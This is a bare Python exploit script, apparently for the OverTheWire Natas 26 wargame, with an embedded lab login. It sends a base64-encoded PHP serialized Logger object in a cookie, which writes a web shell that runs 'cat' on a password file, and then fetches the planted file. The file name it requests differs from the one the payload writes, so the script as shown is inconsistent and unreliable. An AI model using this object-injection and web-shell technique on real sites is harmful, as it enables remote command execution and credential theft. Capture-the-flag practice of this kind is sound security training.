import requests
import re
import base64

url = 'http://natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T@natas26.natas.labs.overthewire.org'

s = requests.Session()

serializedObject = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL21iZXJ6Mi5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30="

mycookies={'drawing':serializedObject}
resp = s.get(url + "?x1=1&y1=1&x2=1&y2=1", cookies=mycookies)
resp = s.get(url + "/img/elafleur.php")
print(resp.text)
